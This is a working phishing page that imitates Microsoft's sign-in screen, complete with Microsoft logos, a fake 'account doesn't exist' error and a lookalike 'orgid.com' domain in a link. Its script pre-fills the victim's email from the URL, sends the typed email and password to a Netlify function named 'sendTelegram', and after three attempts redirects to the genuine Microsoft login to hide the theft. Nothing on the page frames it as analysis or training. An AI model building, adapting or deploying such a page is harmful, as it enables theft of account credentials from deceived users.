<!doctype html>
<html dir="ltr" class="" lang="en">
<head>
  <title>Sign in to your account</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
  <meta charset="utf-8">
  <link rel="shortcut icon" href="images/favicon.ico">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta name="PageID" content="ConvergedSignIn">
  <meta name="SiteID" content="">
  <meta name="ReqLC" content="1033">
  <meta name="LocLC" content="en-US">

  <!-- Single, correct jQuery include (removed duplicates / fixed malformed tag) -->
  <script src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>

  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
    crossorigin="anonymous">

  <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">

  <!-- Use Font Awesome CSS CDN so icons render reliably (fallback to CSS instead of kit) -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"
    integrity="sha512-dyZ88n1q9+Nfw1TqK4XxVnq1j3qF4K2xj3b7K8f1yF5+4k6eZ2R5y0U9bq3y5f4b1L9z6V2q3Xx2p8r4x6jA=="
    crossorigin="anonymous" referrerpolicy="no-referrer" />

  <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>

  <link href="css/hover.css" rel="stylesheet" media="all">

  <style type="text/css">
    /* Ensure background is applied and visible, override any competing rules */
    html, body {
      height: 100% !important;
      margin: 0 !important;
    }

    /* Use absolute path to images to avoid base-path issues; kept relative fallback also works */
    body {
      background-image: url('/images/bg5.png') !important;
      background-size: cover !important;
      background-repeat: no-repeat !important;
      background-attachment: fixed !important;
      background-position: center center !important;
      background-color: transparent !important;
    }

    /* Prevent container backgrounds from obscuring the page background */
    .container-fluid, .container, .row {
      background: transparent !important;
    }

    /* Keep card white as original, but ensure it doesn't unexpectedly fill the whole viewport */
    #div1, #div2 {
      background: #ffffff; /* keep original look */
    }
  </style>
</head>

<body>
  <div class="container-fluid p-0">
    <div class="container">
      <div class="row my-5 py-5">
        <div class="col-lg-6 mx-auto">
          <div class="m-5 p-4 bg-white" id="div1">
            <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
            <span class="h5">Sign In</span><br>
            <span id="error" class="text-danger">That Microsoft account doesn't exist. Enter a different account</span>
            <div class="form-group mt-2">
              <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Email, phone or skype" style="border-right: none;border-left: none;border-top: none;">
            </div>
            <p>No account? <a href="https://signup.live.com/signup?ru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1033%26response_type%3dcode%26client_id%3d51483342-085c-4d86-bf88-cf50c7252078%26scope%3dopenid%2bprofile%2bemail%2boffline_access%26response_mode%3dform_post%26redirect_uri%3dhttps%253a%252f%252flogin.microsoftonline.com%252fcommon%252ffederation%252foauth2%26state%3drQIIAeNisNLJKCkpKLbS1y_ILypJzNHLzUwuyi_OTyvJz8vJzEvVS87P1csvSs9MAbGKhLgEXtk_X7dhr6zr3uYXtw5zqiyexcgZn5NZBla5ilGZsHH6FxgZXzAy3mIS9C9K90wJL3ZLTUktSizJzM-7wCLwioXHgNmKg4NLgEGCQYHhBwvjIlagrZymylOOHFzvusZeeda6cxYMp1j1o6q8LfJ9zTO9Ukz9wyrdfC1NS3MtLDxy87y00wyKwoOKQjIDSsrKjAJCA20trAwnsAlNYGM6xcbwgY2xg53hACfjLS4RIwNDS10DI10DEwUDcytTCysjsygA0%26estsfed%3d1%26lw%3d1%26fl%3deasi2%26fci%3dhttps%253a%252f%252fportal.microsoftonline.com.orgid.com%26mkt%3dEN-US%26uaid%3daee73feabdb0451dbd83e8dac30924a3&mkt=EN-US&uiflavor=web&lw=1&fl=easi2&client_id=51483342-085c-4d86-bf88-cf50c7252078&uaid=aee73feabdb0451dbd83e8dac30924a3&suc=https%3a%2f%2fportal.microsoftonline.com.orgid.com&lic=1">Create one!</a></p>
            <p><a href="#">Sign in with a security key</a></p>
            <p><a href="#">sign in options</a></p>
            <div class="text-right">
              <button class="btn rounded-0 text-white px-4" id="next" style="background-color: #0066BA;">Next</button>
            </div>
          </div>

          <div class="m-5 p-4 bg-white" id="div2">
            <form id="contact">
              <img src="images/microsoft_logo.svg" class="img-fluid" alt="Microsoft logo"><br><br>
              <i class="fas fa-arrow-left" id="back" style="cursor:pointer"></i>&nbsp;<span id="emailch">abc@abc.com</span><br>
              <span id="msg" class="text-danger"></span><br>
              <span class="h5">Password</span>
              <div class="form-group mt-2">
                <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password" style="border-right: none;border-left: none;border-top: none;">
              </div>
              <p>No account? <a href="#">Create one!</a></p>
              <p><a href="#">Sign in with a security key</a></p>
              <p><a href="#">sign in options</a></p>
              <div class="text-right">
                <button class="btn rounded-0 text-white px-4" id="submit-btn" style="background-color: #0066BA;">login</button>
              </div>
            </form>
          </div>

        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap JS dependencies (Popper) and Bootstrap JS (kept at bottom) -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
    crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
    crossorigin="anonymous"></script>

  <script>
    /* global $ */
    $(document).ready(function(){

      $('#error').hide();
      $("#div2").hide();
      $("#msg").hide();

      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        $('#email').val(email);
        var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $("#div1").animate({left:200, opacity:"hide"}, 0);
        $("#div2").animate({right:200, opacity:"show"}, 1000);
        $("#emailch").html(my_email);
      }

      $('#email').click(function(){
        $('#error').hide();
      });
      $('#next').click(function () {
        var my_email =$('#email').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        $("#div1").animate({left:200, opacity:"hide"}, 0);
        $("#div2").animate({right:200, opacity:"show"}, 1000);
        $("#emailch").html(my_email);
      });
      $('#back').click(function () {
        $("#msg").hide();
        $("#div2").animate({left:200, opacity:"hide"}, 0);
        $("#div1").animate({right:200, opacity:"show"}, 1000);

      });

      var count=0;
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();
        var msg = $('#msg').html();
        $('#msg').text( msg );
        count=count+1;
        if (count>=3) {
          // use https for redirect
          window.location.replace("https://login.microsoftonline.com");
        }
        else
        {
         $.ajax({
          dataType: 'JSON',
          // UPDATED: post to Netlify function endpoint
          url: '/.netlify/functions/sendTelegram',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,
          },
          beforeSend: function(xhr){
            $('#submit-btn').html('Verifing...');
          },
          success: function(response){
            if(response){
              $("#msg").show();
              console.log(response);
              if(response['signal'] == 'ok'){
               $('#msg').html(response['msg']);
             }
             else{
              $('#msg').html(response['msg']);
            }
          }
        },
        error: function(){
          $("#msg").show();
          $('#msg').html("Please try again later");
        },
        complete: function(){
          $('#submit-btn').html('Login');
        }
      });
       }
     });
    });
  </script>
</body>
</html>
